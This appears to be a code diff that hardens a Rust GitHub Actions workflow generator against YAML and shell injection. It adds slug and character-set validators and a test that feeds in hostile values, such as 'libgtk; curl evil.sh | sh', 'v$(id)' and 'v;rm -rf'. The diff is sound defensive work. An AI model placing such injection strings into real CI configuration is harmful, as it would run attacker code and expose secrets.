@@ -115,6 +115,15 @@ impl ExecutionBackend for GitHubActionsBackend {
                     binding.binding_id
                 )));
             }
+            // binding id 进入 workflow 文件名、ownedResources、runner 的
+            // runtime 路径与 run-name——`/`、`..`、空白或 YAML 元字符会变成
+            // 路径逃逸或 workflow 注入，slug 形状在写文件之前钉死。
+            if !is_safe_projection_identifier(&binding.binding_id) {
+                return Err(PublishError::Execution(format!(
+                    "GitHub Actions binding identity {:?} is not a safe slug",
+                    binding.binding_id
+                )));
+            }
 
             let runtime_path = format!(
                 ".one-publish/automation/runtime/{}.json",
@@ -188,6 +197,112 @@ fn public_setting<'a>(
     })
 }
 
+// ---- 渲染边界形状校验 -------------------------------------------------------
+//
+// 生成的 workflow 是 YAML/shell 混合文本：投影值在 `on.push.tags`、
+// `run-name`、文件名、artifact 名与 `run:` 命令内被内插。上游投影构造
+// 多由控制面常量填充，但渲染边界不依赖上游善意——每个进入语法的值都按
+// 其消费面的真实字符集收口（fail-closed）。
+
+/// 投影标识（binding id）：进入 workflow 文件名、ownedResources、runtime
+/// 路径与 run-name——slug 形状，禁路径逃逸。
+fn is_safe_projection_identifier(id: &str) -> bool {
+    !id.is_empty()
+        && id
+            .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_alphanumeric())
+        && id
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
+        && !id.contains("..")
+}
+
+/// tag 前缀进入 `on.push.tags` 的单引号 YAML 标量——按 git ref 字符集
+/// （不含 `..`/`@{`）收口，引号/换行/冒号一律拒绝。
+fn is_safe_tag_prefix(prefix: &str) -> bool {
+    !prefix.is_empty()
+        && prefix.bytes().all(|byte| {
+            byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-' | b'/' | b'@')
+        })
+        && !prefix.contains("..")
+        && !prefix.contains("@{")
+}
+
+/// runner 分发仓库必须严格为 `owner/repo` 两段。
+fn is_safe_runner_repository(repository: &str) -> bool {
+    let mut parts = repository.split('/');
+    match (parts.next(), parts.next(), parts.next()) {
+        (Some(owner), Some(repo), None) => [owner, repo].iter().all(|segment| {
+            !segment.is_empty()
+                && segment
+                    .bytes()
+                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
+        }),
+        _ => false,
+    }
+}
+
+/// runner 发布 tag 进入下载 URL 路径段——ref 形状，禁 `..`。
+fn is_safe_release_tag(tag: &str) -> bool {
+    !tag.is_empty()
+        && tag
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
+        && !tag.contains("..")
+}
+
+/// 逗号拼接前的单个 rust target triple（`x86_64-unknown-linux-gnu`、
+/// `universal-apple-darwin` 同族）。
+fn is_safe_target_triple(triple: &str) -> bool {
+    !triple.is_empty()
+        && triple
+            .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_alphanumeric())
+        && triple
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
+}
+
+/// Debian 包名：`[a-z0-9][a-z0-9+.-]*`（`libwebkit2gtk-4.1-dev` 同族）。
+fn is_safe_system_package(name: &str) -> bool {
+    name.len() >= 2
+        && name
+            .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit())
+        && name.bytes().all(|byte| {
+            byte.is_ascii_lowercase() || byte.is_ascii_digit() || matches!(byte, b'+' | b'.' | b'-')
+        })
+}
+
+/// cargo 工具名按 crate 名形状收口（`tauri-cli` 同族）。
+fn is_safe_cargo_tool(tool: &str) -> bool {
+    !tool.is_empty()
+        && tool
+            .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_alphanumeric())
+        && tool
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
+}
+
+/// secret 名进入 YAML 键位与 `secrets.<name>` 表达式——GitHub Secret 命名：
+/// `[A-Z0-9_]`、非数字起始、`GITHUB_` 前缀保留（与发布设置 §3 同款规则）。
+fn is_safe_secret_env_name(name: &str) -> bool {
+    !name.is_empty()
+        && name
+            .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_uppercase())
+        && name
+            .bytes()
+            .all(|byte| byte.is_ascii_uppercase() || byte.is_ascii_digit() || byte == b'_')
+        && !name.starts_with("GITHUB_")
+}
+
 /// 薄外壳分片 workflow（决议 #85/#81）：每个平台族一个 build job + 一个
 /// 汇聚 job。每个 job 下载控制面钉住的 runner 资产并离线校验 sha256，
 /// 现场规划后只执行分配给本段亲和的节点子集，段结束上传事件段 artifact
@@ -203,7 +318,14 @@ fn render_thin_shell_workflow(
     let (on_block, run_name_block, trigger_env, trigger_descriptor, attempt_expression) =
         match &binding.trigger_policy {
             AutomationTriggerPolicy::TagPush { tag_prefix } => (
-                format!("  push:\n    tags:\n      - '{tag_prefix}[0-9]*.[0-9]*.[0-9]*'\n"),
+                if is_safe_tag_prefix(tag_prefix) {
+                    format!("  push:\n    tags:\n      - '{tag_prefix}[0-9]*.[0-9]*.[0-9]*'\n")
+                } else {
+                    return Err(PublishError::Execution(format!(
+                        "GitHub Actions binding {} declares an unsafe tag prefix {tag_prefix:?}",
+                        binding.binding_id
+                    )));
+                },
                 String::new(),
                 String::new(),
                 "tag:${GITHUB_REF_NAME}",
@@ -249,6 +371,19 @@ fn render_thin_shell_workflow(
     };
     let repository = distribution_field("repository")?;
     let release_tag = distribution_field("releaseTag")?;
+    // 二者进入 runner 资产下载 URL——形状不合法即路径注入或非法端点。
+    if !is_safe_runner_repository(repository) {
+        return Err(PublishError::Execution(format!(
+            "GitHub Actions binding {} declares an unsafe runner repository {repository:?}",
+            binding.binding_id
+        )));
+    }
+    if !is_safe_release_tag(release_tag) {
+        return Err(PublishError::Execution(format!(
+            "GitHub Actions binding {} declares an unsafe runner release tag {release_tag:?}",
+            binding.binding_id
+        )));
+    }
     let runtime = &binding.runtime_revision;
     let shard_platforms = public_setting(binding, "shardPlatforms")?
         .as_array()
@@ -299,20 +434,28 @@ fn render_thin_shell_workflow(
 
     // 凭据暴露面（ADR-0029/§6）：交付 Secrets 只注入汇聚 job——build 段
     // 运行使用者的构建与门禁程序，不得读到交付 token；触发 env 两类 job 都要。
-    let env_block_for = |with_secrets: bool| {
+    let env_block_for = |with_secrets: bool| -> Result<String, PublishError> {
         let mut lines = trigger_env.clone();
         if with_secrets {
             for secret_name in binding.projection.secret_references.values() {
+                // secret 名进入 YAML 键位与 `secrets.<name>` 表达式——按
+                // GitHub Secret 命名规则收口（`GITHUB_` 前缀保留，与 §3 一致）。
+                if !is_safe_secret_env_name(secret_name) {
+                    return Err(PublishError::Execution(format!(
+                        "GitHub Actions binding {} projects an unsafe secret name {secret_name:?}",
+                        binding.binding_id
+                    )));
+                }
                 lines.push_str(&format!(
                     "          {secret_name}: ${{{{ secrets.{secret_name} }}}}\n"
                 ));
             }
         }
-        if lines.is_empty() {
+        Ok(if lines.is_empty() {
             String::new()
         } else {
             format!("        env:\n{lines}")
-        }
+        })
     };
 
     // 现场规划要求干净 checkout（决议 #87）：外壳自有文件（runner 资产、
@@ -341,9 +484,9 @@ fn render_thin_shell_workflow(
 "#
         ))
     };
-    let shard_step = |affinity: &str, binary: &str| {
-        let env_block = env_block_for(affinity == "any");
-        format!(
+    let shard_step = |affinity: &str, binary: &str| -> Result<String, PublishError> {
+        let env_block = env_block_for(affinity == "any")?;
+        Ok(format!(
             r#"      - name: Execute the {affinity} shard
         shell: bash
 {env_block}        run: |
@@ -366,7 +509,7 @@ fn render_thin_shell_workflow(
           path: one-publish-events-{affinity}.json
           if-no-files-found: ignore
 "#
-        )
+        ))
     };
 
     // 构建工具链（S1 闭环）：runner 直执行密封构建命令，环境准备是外壳
@@ -379,7 +522,18 @@ fn render_thin_shell_workflow(
           toolchain: stable
           targets: {targets}
 "#,
-            targets = rust_targets_for(platform)?,
+            targets = {
+                let targets = rust_targets_for(platform)?;
+                // 逗号拼接的三元组进 `targets:` YAML 标量——每个三元组必须
+                // 是三元组形状（上游 enabled_targets 校验之外的双保险）。
+                if !targets.split(',').all(is_safe_target_triple) {
+                    return Err(PublishError::Execution(format!(
+                        "GitHub Actions binding {} renders unsafe rust targets {targets:?}",
+                        binding.binding_id
+                    )));
+                }
+                targets
+            },
         );
         // 系统包由 Provider 声明经投影注入（§4/§5：Backend 不携带 Provider
         // 特例），此处只按数据渲染到本族 job。
@@ -388,12 +542,25 @@ fn render_thin_shell_workflow(
             .and_then(|value| value.get(platform))
             .and_then(Value::as_array)
             .map(|values| {
+                // 每个包名进 `apt-get install` 的 run: 行——按 Debian 包名
+                // 字符集收口，空格/分号/重定向会在 join 之前先被拦下。
                 values
                     .iter()
                     .filter_map(Value::as_str)
-                    .collect::<Vec<_>>()
-                    .join(" ")
+                    .map(|name| {
+                        if is_safe_system_package(name) {
+                            Ok(name)
+                        } else {
+                            Err(PublishError::Execution(format!(
+                                "GitHub Actions binding {} renders an unsafe system package {name:?}",
+                                binding.binding_id
+                            )))
+                        }
+                    })
+                    .collect::<Result<Vec<_>, _>>()
+                    .map(|names| names.join(" "))
             })
+            .transpose()?
             .filter(|joined| !joined.is_empty())
         {
             steps.push_str(&format!(
@@ -449,6 +616,13 @@ fn render_thin_shell_workflow(
         // 附加 cargo 工具由 Provider 声明注入（如 tauri-cli），按数据渲染。
         if let Some(tools) = toolchain.get("cargoTools").and_then(Value::as_array) {
             for tool in tools.iter().filter_map(Value::as_str) {
+                // crate 名进 `cargo install <tool> --locked` 的 run: 行。
+                if !is_safe_cargo_tool(tool) {
+                    return Err(PublishError::Execution(format!(
+                        "GitHub Actions binding {} renders an unsafe cargo tool {tool:?}",
+                        binding.binding_id
+                    )));
+                }
                 steps.push_str(&format!(
                     "      - name: Install {tool}\n        run: cargo install {tool} --locked\n"
                 ));
@@ -489,7 +663,7 @@ fn render_thin_shell_workflow(
 {toolchain}{install}{shard}{staging}"#,
             toolchain = toolchain_steps(platform)?,
             install = install_step(platform)?,
-            shard = shard_step(platform, binary),
+            shard = shard_step(platform, binary)?,
             staging = staging_handoff(platform),
         ));
     }
@@ -528,7 +702,7 @@ fn render_thin_shell_workflow(
           fi
 {shard}"#,
         install = install_step("linux")?,
-        shard = shard_step("any", "one-publish-runner"),
+        shard = shard_step("any", "one-publish-runner")?,
     ));
 
     Ok(format!(
@@ -634,6 +808,115 @@ mod tests {
                     "ONE_PUBLISH_CI_GITHUB_TOKEN".to_string(),
                 )]),
             },
+        }
+    }
+
+    /// 渲染边界校验：投影值内插进 YAML/shell 的每个位置按消费面字符集
+    /// 收口——引号、换行、`..`、shell 元字符全部 fail-closed。
+    #[test]
+    fn thin_shell_rendering_rejects_injection_shaped_projection_values() {
+        let backend = GitHubActionsBackend::new(Arc::new(crate::StaticCredentialSource::new()));
+
+        // binding id → workflow 文件名 + ownedResources + run-name。
+        for hostile in [
+            "../outside",
+            "a/../../b",
+            "binding with space",
+            "id'quote",
+            "id\nrun: pwned",
+            "-leading-dash",
+        ] {
+            let mut candidate = binding("stable", "v", "rev");
+            candidate.binding_id = hostile.to_string();
+            assert!(
+                backend.render_automation_bundle(&[candidate]).is_err(),
+                "binding id {hostile:?} must be rejected"
+            );
+        }
+
+        // tag prefix → on.push.tags 单引号 YAML 标量。
+        for hostile in [
+            "v' && evil",
+            "v'\n      pwned:",
+            "v..x",
+            "v@{",
+            "v with space",
+            "v;rm -rf",
+            "v`id`",
+            "v$(id)",
+        ] {
+            let mut candidate = binding("stable", "v", "rev");
+            candidate.trigger_policy = AutomationTriggerPolicy::TagPush {
+                tag_prefix: hostile.to_string(),
+            };
+            assert!(
+                backend.render_automation_bundle(&[candidate]).is_err(),
+                "tag prefix {hostile:?} must be rejected"
+            );
+        }
+
+        // repository → runner 下载 URL。
+        for hostile in ["owner", "a/b/c", "owner/repo?x", "owner repo/name", ""] {
+            let mut candidate = binding("stable", "v", "rev");
+            candidate.projection.public_settings.insert(
+                "runnerDistribution".to_string(),
+                serde_json::json!({"repository": hostile, "releaseTag": "runner-v0.1.0"}),
+            );
+            assert!(
+                backend.render_automation_bundle(&[candidate]).is_err(),
+                "repository {hostile:?} must be rejected"
+            );
+        }
+
+        // release tag → 下载 URL 路径段。
+        for hostile in ["tag/../x", "tag with space", "tag?query", ""] {
+            let mut candidate = binding("stable", "v", "rev");
+            candidate.projection.public_settings.insert(
+                "runnerDistribution".to_string(),
+                serde_json::json!({"repository": "sperictao/one-publish", "releaseTag": hostile}),
+            );
+            assert!(
+                backend.render_automation_bundle(&[candidate]).is_err(),
+                "release tag {hostile:?} must be rejected"
+            );
+        }
+
+        // rust targets → `targets:` YAML 标量。
+        let mut candidate = binding("stable", "v", "rev");
+        candidate
+            .projection
+            .public_settings
+            .get_mut("shardToolchain")
+            .unwrap()["rustTargets"]["linux"] = serde_json::json!("x86_64\n      - name: pwned");
+        assert!(backend.render_automation_bundle(&[candidate]).is_err());
+
+        // system packages → `apt-get install` run: 行。
+        let mut candidate = binding("stable", "v", "rev");
+        candidate
+            .projection
+            .public_settings
+            .get_mut("shardToolchain")
+            .unwrap()["systemPackages"]["linux"] = serde_json::json!(["libgtk; curl evil.sh | sh"]);
+        assert!(backend.render_automation_bundle(&[candidate]).is_err());
+
+        // cargo tools → `cargo install` run: 行。
+        let mut candidate = binding("stable", "v", "rev");
+        candidate
+            .projection
+            .public_settings
+            .get_mut("shardToolchain")
+            .unwrap()["cargoTools"] = serde_json::json!(["tool && curl evil.sh"]);
+        assert!(backend.render_automation_bundle(&[candidate]).is_err());
+
+        // secret names → YAML 键位 + secrets 表达式。
+        for hostile in ["lower_case", "GITHUB_TOKEN", "1ST_DIGIT", "NAME-WITH-DASH"] {
+            let mut candidate = binding("stable", "v", "rev");
+            candidate.projection.secret_references =
+                BTreeMap::from([("ref".to_string(), hostile.to_string())]);
+            assert!(
+                backend.render_automation_bundle(&[candidate]).is_err(),
+                "secret name {hostile:?} must be rejected"
+            );
         }
     }
 
